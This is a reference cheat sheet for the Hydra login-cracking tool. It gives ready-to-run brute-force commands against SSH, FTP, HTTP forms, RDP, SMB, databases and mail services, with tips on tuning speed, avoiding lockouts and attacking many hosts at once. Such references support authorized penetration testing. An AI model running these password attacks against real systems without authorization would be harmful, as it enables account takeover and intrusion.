# Hydra

> Fast network login cracker supporting 50+ protocols. Use only on authorized targets.

## Quickstart

```bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://10.10.10.10

# FTP with user list
hydra -L users.txt -P passwords.txt ftp://10.10.10.10

# HTTP POST form
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"

# RDP
hydra -l administrator -P passwords.txt rdp://10.10.10.10

# With verbose output
hydra -V -l admin -P passwords.txt ssh://10.10.10.10
```

## Core Concepts

| Concept | Description |
|---------|-------------|
| Module | Protocol-specific attack (ssh, ftp, http-post-form) |
| `^USER^` / `^PASS^` | Placeholders replaced during attack |
| Tasks (`-t`) | Parallel connections (careful with lockouts) |
| `-e nsr` | Extra checks: null, same-as-user, reversed |

## Syntax

```text
# URL style
hydra [options] protocol://target:port/options

# Classic style
hydra [options] target protocol [module-options]
```

## Options

### Authentication

| Option | Description |
|--------|-------------|
| `-l <user>` | Single username |
| `-L <file>` | Username list |
| `-p <pass>` | Single password |
| `-P <file>` | Password list |
| `-C <file>` | Colon-separated user:pass file |
| `-e nsr` | n=null pass, s=user as pass, r=reversed |

### Target

| Option | Description |
|--------|-------------|
| `-s <port>` | Custom port |
| `-S` | Use SSL |
| `-M <file>` | Target list (one per line) |
| `-6` | IPv6 mode |

### Performance

| Option | Description |
|--------|-------------|
| `-t <n>` | Tasks/threads (default 16) |
| `-w <sec>` | Timeout per attempt |
| `-c <sec>` | Wait time per login cycle |

### Control

| Option | Description |
|--------|-------------|
| `-f` | Stop on first valid pair |
| `-F` | Stop on first valid pair (all hosts) |
| `-u` | Loop users (try 1 pass per user first) |
| `-v` / `-V` | Verbose / show every attempt |
| `-o <file>` | Output file |
| `-b json` | Output format (text, json) |

### Module Help

| Option | Description |
|--------|-------------|
| `-U <module>` | Show module usage |
| `hydra -h` | General help |

## Recipes

### SSH

```bash
# Single user, password list
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 4

# User list
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4

# With extra checks (null, same, reversed)
hydra -l admin -P passwords.txt -e nsr ssh://10.10.10.10
```

### FTP

```bash
hydra -l anonymous -P passwords.txt ftp://10.10.10.10
hydra -L users.txt -P passwords.txt ftp://10.10.10.10 -t 10
```

### HTTP Basic Auth

```bash
# GET request with basic auth
hydra -l admin -P passwords.txt 10.10.10.10 http-get /admin

# HTTPS
hydra -l admin -P passwords.txt 10.10.10.10 https-get /secure
```

### HTTP POST Form

```bash
# Standard login form
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# With cookies
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=failed:H=Cookie: session=abc123"

# HTTPS
hydra -l admin -P passwords.txt 10.10.10.10 https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

**Form syntax:** `"/path:POST_DATA:FAIL_STRING"` or `"S=SUCCESS_STRING"`

### SMB

```bash
hydra -l administrator -P passwords.txt smb://10.10.10.10
hydra -L users.txt -P passwords.txt smb://10.10.10.10 -t 1
```

### RDP

```bash
hydra -l administrator -P passwords.txt rdp://10.10.10.10 -t 1
```

### MySQL / MSSQL / PostgreSQL

```bash
hydra -l root -P passwords.txt mysql://10.10.10.10
hydra -l sa -P passwords.txt mssql://10.10.10.10
hydra -l postgres -P passwords.txt postgres://10.10.10.10
```

### SMTP

```bash
hydra -l user@domain.com -P passwords.txt smtp://10.10.10.10
hydra -l user -P passwords.txt 10.10.10.10 smtp PLAIN
```

### IMAP / POP3

```bash
hydra -l user -P passwords.txt imap://10.10.10.10
hydra -l user -P passwords.txt pop3://10.10.10.10
```

### SNMP

```bash
hydra -P community_strings.txt 10.10.10.10 snmp
```

### Multi-Host

```bash
# hosts.txt = one IP per line
hydra -L users.txt -P passwords.txt -M hosts.txt ssh -t 4
```

## Output & Parsing

```bash
# Save results
hydra -l admin -P passwords.txt ssh://10.10.10.10 -o results.txt

# JSON output
hydra -l admin -P passwords.txt ssh://10.10.10.10 -o results.json -b json

# Parse JSON
cat results.json | jq '.results[] | "\(.host) \(.login):\(.password)"'
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Account lockout | Reduce `-t`, add `-c` delay |
| Connection refused | Check port, use `-s` for custom port |
| HTTP form not working | Check `^USER^`/`^PASS^` placement, verify failure string |
| SSL errors | Add `-S` flag |
| Module help | Run `hydra <module> -U` |

## References

- [THC-Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra Documentation](https://www.kali.org/tools/hydra/)
